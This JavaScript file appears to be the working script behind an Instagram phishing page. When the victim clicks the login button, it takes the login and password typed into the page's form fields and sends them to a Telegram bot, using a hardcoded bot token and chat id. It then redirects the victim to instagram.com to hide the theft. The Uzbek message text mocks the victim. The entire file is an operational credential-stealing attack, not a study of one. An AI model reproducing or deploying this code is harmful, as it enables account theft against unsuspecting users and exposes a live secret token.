let Bot_Token = '6716379131:AAFK24qLqIxyKLn6BoPivwkJwudkHpSkA-8';
let inputs = document.querySelectorAll('input')

inputs[2].addEventListener('click', (event) => {
    event.preventDefault()

    fetch(`https://api.telegram.org/bot${Bot_Token}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: '5283508005',
            text: `\n Yeb qoygan bollani accounti: \n\n Login: ${inputs[0].value} \n Password: ${inputs[1].value}`,
        })
    })
    .then(res => res.json())
    .then(data => {
        window.location.href = 'https://instagram.com'
    })
    .catch(error => console.log('error', error))
})